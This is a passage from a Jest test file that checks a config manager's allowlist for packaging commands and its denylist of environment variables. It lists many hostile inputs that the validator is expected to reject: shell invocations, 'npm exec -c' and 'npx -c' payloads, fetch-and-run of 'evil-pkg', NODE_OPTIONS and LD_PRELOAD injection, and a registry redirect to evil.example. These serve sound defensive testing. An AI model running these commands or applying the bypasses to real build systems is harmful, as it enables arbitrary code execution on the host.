        // planted, not a runner on PATH.
        ['./npm package', './npm'],
        ['../../tools/npm package', '../../tools/npm'],
        ['node_modules/.bin/serverless package', 'node_modules/.bin/serverless'],
        ['C:\\Windows\\System32\\cmd.exe /c id', 'C:\\Windows\\System32\\cmd.exe'],
        // `env` reaches any binary with any environment — the whole point of
        // the allowlist, one indirection away.
        ['env NODE_OPTIONS=--require=/tmp/x.js npm run package', 'env'],
        // Quoting must not launder the token: the packager strips the quotes
        // before spawning, so validation strips them too.
        ['"/bin/sh" -c id', '/bin/sh'],
        ["'/bin/sh' -c id", '/bin/sh'],
        // A near-miss on an allowed name is still not that name.
        ['npmx run package', 'npmx'],
        ['NPM run package', 'NPM'],
      ];
      for (const [command, runner] of rejected) {
        expect(updateErr(cm, { packageCommand: command }).details).toEqual([
          `"packageCommand" must start with one of: ${RUNNERS} — "${runner}" is not an allowed package runner`,
        ]);
      }
      expect(fs.writeFileSync).not.toHaveBeenCalled();
    });

    it('rejects a command that tokenizes to nothing, and a non-string', () => {
      const cm = setupFile({});
      // Whitespace only: non-empty as a string, but the packager would spawn
      // nothing at all, so it reports the same "not an allowed runner" verdict
      // with an empty token rather than slipping through.
      expect(updateErr(cm, { packageCommand: '   ' }).details).toEqual([
        `"packageCommand" must start with one of: ${RUNNERS} — "" is not an allowed package runner`,
      ]);
      // The plain string checks still run first.
      expect(updateErr(cm, { packageCommand: '' }).details).toEqual([
        '"packageCommand" must be a non-empty string',
      ]);
      expect(updateErr(cm, { packageCommand: 123 }).details).toEqual([
        '"packageCommand" must be a non-empty string',
      ]);
      expect(fs.writeFileSync).not.toHaveBeenCalled();
    });

    it('fences the per-service copy the same way, reporting the entry path', () => {
      const cm = setupFile({});
      expect(updateErr(cm, {
        servicePackaging: { access: { packageCommand: '/bin/sh', packageArgs: ['-c', 'id'] } },
      }).details).toEqual([
        `"servicePackaging.access.packageCommand" must start with one of: ${RUNNERS} — "/bin/sh" is not an allowed package runner`,
      ]);
      expect(updateErr(cm, {
        servicePackaging: { access: { packageCommand: '' } },
      }).details).toEqual([
        '"servicePackaging.access.packageCommand" must be a non-empty string',
      ]);
      expect(fs.writeFileSync).not.toHaveBeenCalled();
    });

    // The bypass that survived the first version of this fence: every allowed
    // runner is itself an interpreter one subcommand in, and
    // `spawn('npm', ['exec','-c','<shell string>'])` executes that string with
    // no shell:true anywhere. Checking the first token alone let all of these
    // through while reporting "npm"/"npx"/"yarn"/"pnpm" as an allowed runner.
    it('rejects the interpreter subcommands of the allowed runners', () => {
      const cm = setupFile({});
      const rejected: Array<[string, string, string]> = [
        // Reads its payload straight off the argv — a shell on the host.
        ['npm exec -c "touch /tmp/RCE_PROOF && id -un > /tmp/RCE_PROOF"', 'npm', 'exec'],
        ['npm x -c "id"', 'npm', 'x'],
        // Fetch-and-run: the package is the caller's, not the project's.
        ['npm exec -p evil-pkg -- evil', 'npm', 'exec'],
        ['yarn dlx evil-pkg', 'yarn', 'dlx'],
        ['pnpm dlx evil-pkg', 'pnpm', 'dlx'],
        ['npm install evil-pkg', 'npm', 'install'],
        ['yarn add evil-pkg', 'yarn', 'add'],
        // Install scripts of a fetched package run as this user, so `add`/`i`
        // are fetch-and-run with an extra step, not an installer.
        ['npm i evil-pkg', 'npm', 'i'],
        // Straight interpreters, reached through the manager's own builtins.
        ['yarn node -e "require(\'child_process\').exec(\'id\')"', 'yarn', 'node'],
        ['yarn exec sh -c id', 'yarn', 'exec'],
        ['pnpm exec sh -c id', 'pnpm', 'exec'],
        ['yarn create evil-app', 'yarn', 'create'],
        // yarn 1's implicit `run` is what makes `yarn node` and `yarn dlx`
        // indistinguishable from a script name, so the explicit form is
        // required — `yarn run package`, not `yarn package`.
        ['yarn package', 'yarn', 'package'],
        ['pnpm package', 'pnpm', 'package'],
        // The Serverless CLIs fetch and run code too, one verb over.
        ['serverless plugin install --name evil-plugin', 'serverless', 'plugin'],
        ['sls plugin install --name evil-plugin', 'sls', 'plugin'],
        ['osls plugin install --name evil-plugin', 'osls', 'plugin'],
      ];
      const verbsOf: Record<string, string> = {
        npm: '"run" or "run-script"',
        yarn: '"run"',
        pnpm: '"run"',
        serverless: '"package"',
        sls: '"package"',
        osls: '"package"',
      };
      for (const [command, runner, verb] of rejected) {
        expect(updateErr(cm, { packageCommand: command }).details).toEqual([
          `"packageCommand": "${runner}" may only be followed by ${verbsOf[runner]} — `
            + `"${verb}" can run a program the caller chose instead of the project's build`,
        ]);
      }
      expect(fs.writeFileSync).not.toHaveBeenCalled();
    });

    // A runner with no subcommand at all is the same bypass with the verb moved
    // into `packageArgs` (which reaches spawn() without a tokenizer), so the
    // command has to carry it.
    it('rejects a bare runner, including the packageArgs-smuggled spelling', () => {
      const cm = setupFile({});
      expect(updateErr(cm, {
        packageCommand: 'npm',
        packageArgs: ['exec', '-c', 'id > /tmp/pwned'],
      }).details).toEqual([
        '"packageCommand": "npm" may only be followed by "run" or "run-script" — the command names no subcommand at all',
      ]);
      expect(updateErr(cm, { packageCommand: 'serverless' }).details).toEqual([
        '"packageCommand": "serverless" may only be followed by "package" — the command names no subcommand at all',
      ]);
      expect(fs.writeFileSync).not.toHaveBeenCalled();
    });

    // npx is a launcher, so it is stripped and what it launches is held to the
    // same grammar. `npx -c '<shell>'` was the shortest RCE of the whole set.
    it('lets npx run only the Serverless CLI, and carry only -y/--yes', () => {
      const cm = setupFile({});
      const badFlags = ['npx -c "id > /tmp/pwned"', 'npx --call "id"', 'npx -p evil-pkg serverless package', 'npx -y -c "id"'];
      for (const command of badFlags) {
        const flag = command.split(' ')[command.startsWith('npx -y') ? 2 : 1];
        expect(updateErr(cm, { packageCommand: command }).details).toEqual([
          `"packageCommand": npx may carry only "-y" or "--yes" before the package name — "${flag}" can name another package to run, or a command string to run as a shell`,
        ]);
      }
      const badPackages: Array<[string, string]> = [
        ['npx evil-pkg', 'evil-pkg'],
        ['npx -y evil-pkg --run', 'evil-pkg'],
        ['npx node -e "id"', 'node'],
        // A scoped name keeps its leading @ — that one is a scope, not a
        // version pin, so it is compared whole and matches nothing.
        ['npx @evil/serverless package', '@evil/serverless'],
        // npx with nothing to launch names no program either way.
        ['npx', ''],
        ['npx -y', ''],
      ];
      for (const [command, spec] of badPackages) {
        expect(updateErr(cm, { packageCommand: command }).details).toEqual([
          `"packageCommand": npx may only run the Serverless CLI (serverless, sls, osls) — "${spec}" is a package of the caller's choosing`,
        ]);
      }
      // …and the CLI it launches still owes the grammar its own verb.
      expect(updateErr(cm, { packageCommand: 'npx serverless plugin install --name evil' }).details).toEqual([
        '"packageCommand": "serverless" may only be followed by "package" — "plugin" can run a program the caller chose instead of the project\'s build',
      ]);
      expect(fs.writeFileSync).not.toHaveBeenCalled();
    });

    // The grammar pins the program; these flags re-point it at another one
    // without changing a single positional token.
    it('rejects flags that redirect an otherwise-allowed command', () => {
      const cm = setupFile({});
      const rejected = [
        // npm picks the binary that interprets the script.
        'npm run package --script-shell=/tmp/evil',
        // The flag spelling of the NODE_OPTIONS that packageEnv already blocks.
        'npm run package --node-options=--require /tmp/x.js',
        // Dashes and case are cosmetic to a config key, so they are stripped
        // before the comparison.
        'npm run package --nodeOptions=--require /tmp/x.js',
        // Another rc file can set script-shell/node-options/yarn-path.
        'npm run package --userconfig /tmp/evil-npmrc',
        'yarn run package --use-yarnrc /tmp/evil-yarnrc',
        // npx fetches the CLI when the service has no local copy, and npm reads
        // its own config flags from anywhere in the argv — so the registry the
        // fetch uses is still the caller's choice unless this is refused.
        'npx serverless package --registry=http://evil.example',
        // Run the scripts of a package.json the caller planted elsewhere.
        'npm run package --prefix /tmp/evil',
        'pnpm run package --dir /tmp/evil',
        // node's own code loaders, refused wherever they appear.
        'npx serverless package --require /tmp/x.js',
      ];
      for (const command of rejected) {
        const flag = command.split(' ').find(t => t.startsWith('-')) as string;
        expect(updateErr(cm, { packageCommand: command }).details).toEqual([
          `"packageCommand" cannot contain "${flag}" — that flag points the package command at a program, shell or config file of the caller's choosing`,
        ]);
      }
      expect(fs.writeFileSync).not.toHaveBeenCalled();
    });

    // packageArgs is appended to the same argv with no tokenizer in between, so
    // it answers to the same flag screen — global and per-service.
    it('screens packageArgs for the same redirecting flags', () => {
      const cm = setupFile({});
      expect(updateErr(cm, {
        packageCommand: 'npm run package',
        packageArgs: ['--stage=dev', '--node-options=--require /tmp/x.js'],
      }).details).toEqual([
        '"packageArgs[1]" cannot contain "--node-options=--require /tmp/x.js" — that flag points the package command at a program, shell or config file of the caller\'s choosing',
      ]);
      expect(updateErr(cm, {
        servicePackaging: { access: { packageArgs: ['--script-shell=/tmp/evil'] } },
      }).details).toEqual([
        '"servicePackaging.access.packageArgs[0]" cannot contain "--script-shell=/tmp/evil" — that flag points the package command at a program, shell or config file of the caller\'s choosing',
      ]);
      // The shape error still comes first and keeps its wording.
      expect(updateErr(cm, { packageArgs: ['ok', 7] }).details).toEqual([
        '"packageArgs" must be an array of strings',
      ]);
      expect(fs.writeFileSync).not.toHaveBeenCalled();
    });

    // The dashboard (OnboardingPage/SettingsPage) writes exactly these shapes
    // through PUT /api/config; the fence must not cost the onboarding flow a
    // single legitimate command.
    it('accepts every legitimate packaging command, global and per-service', () => {
      const accepted = [
        'npx serverless package', // the LSS default
        'npm run package',
        'npm run package:local',
        'npm run-script package',
        'yarn run package',
        'pnpm run package',
        'serverless package --stage dev',
        'sls package',
        'osls package',
        'npx sls package --param="custom-stage=offline"',
        // `-y` is the one npx flag that only answers a prompt.
        'npx -y serverless package',
        // A version pin names the same program.
        'npx serverless@3.38.0 package',
        // Serverless's own short flags stay usable: -c/-p/-r are --config,
        // --package and --region there, so the screen never claims them.
        'sls package -c custom.yml -p .build -r us-east-1',
        // Quoted runner: the packager unquotes before spawning, so validation
        // sees the same `npm` it does.
        '"npm" run package',
      ];
      for (const command of accepted) {
        const cm = setupFile({});
        cm.updateConfig({ packageCommand: command, servicePackaging: { access: { packageCommand: command } } });
        expect(written().packageCommand).toBe(command);
        expect(written().servicePackaging).toEqual({ access: { packageCommand: command } });
      }
      // The documented packageArgs example is untouched by the flag screen.
      const cm = setupFile({});
      cm.updateConfig({ packageArgs: ['--param=custom-stage=offline'] });
      expect(written().packageArgs).toEqual(['--param=custom-stage=offline']);
    });
  });

  describe('packageEnv loader-hook denylist', () => {
    it('rejects NODE_OPTIONS — code injection that ignores which binary ran', () => {
      const cm = setupFile({});
      expect(updateErr(cm, { packageEnv: { NODE_OPTIONS: '--require /tmp/x.js' } }).details).toEqual([
        '"packageEnv.NODE_OPTIONS" cannot be set — it injects code into the packaging process',
      ]);
      // Windows env lookup is case-insensitive, so the lowercase spelling is
      // the identical bypass and is compared the same way.
      expect(updateErr(cm, { packageEnv: { node_options: '--require /tmp/x.js' } }).details).toEqual([
        '"packageEnv.node_options" cannot be set — it injects code into the packaging process',
      ]);
      expect(updateErr(cm, { packageEnv: { Node_Options: '--require /tmp/x.js' } }).details).toEqual([
        '"packageEnv.Node_Options" cannot be set — it injects code into the packaging process',
      ]);
      expect(fs.writeFileSync).not.toHaveBeenCalled();
    });

    // PATH is the member that reads as configuration rather than as an attack.
    // The packager spawns without a shell, but the shell was never what found
    // the binary: libuv execvp()s with the CHILD's environment, so the child's
    // PATH picks which file named `npm` runs. Verified by planting an
    // executable named `npm` on a prepended directory — it ran. Allowing it
    // would hand back exactly what ALLOWED_PACKAGE_RUNNERS takes away.
    it('rejects PATH and NODE_PATH — they choose which binary the runner allowlist resolves to', () => {
      const cm = setupFile({});
      expect(updateErr(cm, { packageEnv: { PATH: '/tmp/evil:/usr/bin' } }).details).toEqual([
        '"packageEnv.PATH" cannot be set — it injects code into the packaging process',
      ]);
      expect(updateErr(cm, { packageEnv: { path: '/tmp/evil' } }).details).toEqual([
        '"packageEnv.path" cannot be set — it injects code into the packaging process',
      ]);
      expect(updateErr(cm, { packageEnv: { NODE_PATH: '/tmp/evil' } }).details).toEqual([
        '"packageEnv.NODE_PATH" cannot be set — it injects code into the packaging process',
      ]);
      // The per-service map carries the same fence as the global one.
      expect(updateErr(cm, {
        servicePackaging: { svc: { packageEnv: { PATH: '/tmp/evil' } } },
      }).details).toEqual([
        '"servicePackaging.svc.packageEnv.PATH" cannot be set — it injects code into the packaging process',
      ]);
      expect(fs.writeFileSync).not.toHaveBeenCalled();
    });

    it('rejects every linker/interpreter hook, in both env maps', () => {
      const cm = setupFile({});
      const blocked = [
        'NODE_OPTIONS',
        'NODE_REPL_EXTERNAL_MODULE',
        'LD_PRELOAD',
        'LD_AUDIT',
        'LD_LIBRARY_PATH',
        'DYLD_INSERT_LIBRARIES',
        'DYLD_LIBRARY_PATH',
        'PATH',
        'NODE_PATH',
      ];
      for (const name of blocked) {
        expect(updateErr(cm, { packageEnv: { [name]: '/tmp/evil.so' } }).details).toEqual([
          `"packageEnv.${name}" cannot be set — it injects code into the packaging process`,
        ]);
        expect(updateErr(cm, {
          servicePackaging: { access: { packageEnv: { [name]: '/tmp/evil.so' } } },
        }).details).toEqual([
          `"servicePackaging.access.packageEnv.${name}" cannot be set — it injects code into the packaging process`,
        ]);
      }
      expect(fs.writeFileSync).not.toHaveBeenCalled();
    });

    it('reports the value-shape error before the key check', () => {
      // Same message as any other string record — a non-string value never
      // reaches the key scan.
      expect(updateErr(setupFile({}), { packageEnv: { NODE_OPTIONS: 1 } }).details).toEqual([
        '"packageEnv" must be an object of string values',
      ]);
    });

    it('leaves ordinary packaging env vars alone, and only fences env maps', () => {
      const cm = setupFile({});
      cm.updateConfig({
        packageEnv: { NPM_TOKEN: 's3cret', SLS_DEBUG: '*', AWS_PROFILE: 'dev' },
        servicePackaging: { access: { packageEnv: { STAGE: 'offline' } } },
        // A branding token that merely SHARES a blocked name is still just a
        // CSS value: the denylist applies to maps that become a child's
        // environment, not to every string record.
        branding: { colors: { NODE_OPTIONS: '#fff' } },
      });
      expect(written().packageEnv).toEqual({ NPM_TOKEN: 's3cret', SLS_DEBUG: '*', AWS_PROFILE: 'dev' });
      expect(written().servicePackaging).toEqual({ access: { packageEnv: { STAGE: 'offline' } } });
      expect(written().branding).toEqual({ colors: { NODE_OPTIONS: '#fff' } });
    });
  });
});
